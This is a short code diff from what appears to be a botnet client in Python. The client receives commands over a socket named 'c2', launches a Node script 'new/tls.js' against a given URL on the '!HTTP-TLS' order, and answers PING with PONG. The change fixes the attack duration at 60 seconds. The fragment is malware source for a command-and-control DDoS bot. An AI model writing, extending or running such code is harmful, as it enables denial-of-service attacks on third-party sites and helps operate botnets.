@@ -210,7 +210,7 @@ def main():
                     if command == '!HTTP-TLS':
                         url = args[1]
                         duration = int(args[2])  # Assuming duration is in seconds
-                        subprocess.run(["node", "new/tls.js", url, str(duration)])
+                        subprocess.run(["node", "new/tls.js", url, '60'])
                 elif command == 'PING':
                     c2.send('PONG'.encode())
             except:
